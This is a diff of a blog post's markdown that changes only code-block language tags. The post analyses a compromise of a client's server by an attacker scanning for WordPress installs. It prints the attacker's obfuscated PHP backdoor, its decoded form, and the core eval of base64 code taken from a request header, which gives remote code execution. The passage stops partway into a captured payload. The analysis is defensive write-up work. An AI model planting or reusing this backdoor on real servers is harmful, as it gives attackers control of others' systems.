@@ -54,7 +54,7 @@ comments:
 ---
 ![](http://alanp.ca/blog/wp-content/uploads/2010/07/chomp.png "Chomp Chomp, Hackers be biting your computar.") Having experienced some 'weird' traffic the other day, a client contacted me regarding this problem. One of the datacenters we deal with contacted my client and sent him the following logs from an attack that seems to occured from his server:
 
-```
+```apache
 access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:03 +0000] "GET /wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
 access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:03 +0000] "GET /old/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
 access.log:xxx.xxx.xxx.xxx - - [01/Jul/2010:12:15:04 +0000] "GET /cms/wp-login.php HTTP/1.1" 404 2533 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
@@ -71,21 +71,21 @@ Obviously, the IPs have been removed to protect the innocent. What we can see fr
 
 After some further inspection of the server, it looks as if an 'attacker' uploaded a PHP file to their account and was now using it to scour the internet for hackable Wordpress installs. A remote machine would send requests to a group of servers hosting this PHP file:
 
-```
+```php
 $_fcxxxcc="\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";
 $_fcxxxcc("\x7c\x2e\x7c\x65","\x65\x76\x61\x6c\x28\x27\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x22aWYobWQ1KCRfU0VSVkVSWydIVFRQX1FVT1RFJ10pPT0nZTY2ZTZjYWRkNmUxM2VmZWE1NGVkNTBjMGViMmQzMmInIGFuZCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0NPREUnXSkpIEBldmFsKEBiYXNlNjRfZGVjb2RlKHN0cnJldihAJF9TRVJWRVJbJ0hUVFBfWF9DT0RFJ10pKSk7\x22\x29\x29\x3b\x27\x29",'.');
 ```
 
 I have to give it to them, at least they obfuscated the code. It took a while before I realized the extent of their hidden code. Unobfuscating this file gives us:
 
-```
+```php
 $_fcxxxcc="preg_replace";
 preg_replace("|.|e","eval('eval(base64_decode("aWYobWQ1KCRfU0VSVkVSWydIVFRQX1FVT1RFJ10pPT0nZTY2ZTZjYWRkNmUxM2VmZWE1NGVkNTBjMGViMmQzMmInIGFuZCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0NPREUnXSkpIEBldmFsKEBiYXNlNjRfZGVjb2RlKHN0cnJldihAJF9TRVJWRVJbJ0hUVFBfWF9DT0RFJ10pKSk7"));')",'.')
 ```
 
 Base 64 decoding this string gives us:
 
-```
+```php
 if(md5($_SERVER['HTTP_QUOTE'])=='e66e6cadd6e13efea54ed50c0eb2d32b'  and isset($_SERVER['HTTP_X_CODE']))
     @eval(@base64_decode(strrev(@$_SERVER['HTTP_X_CODE'])));
 ```
@@ -93,7 +93,7 @@ Finally, we're getting somewhere!
 
 Brief inspection of this code shows that the attackers are sending a payload which gets interpreted by the local system. But, what kind of payload are they sending to their script? Since this file was being called quite periodically, dumping the information to a text file gives us all of the information we are looking for. After a day, I came back to check on the script to find payload that looks like this (decoding and comments by me):
 
-```
+```php
 header("X_GZIP: TRUE");
 header("X_MD5: 8b72825b0b211b07f8378013cbfb0d17");
 error_reporting(E_ALL); ini_set("display_errors",1); $cr=curl_init();
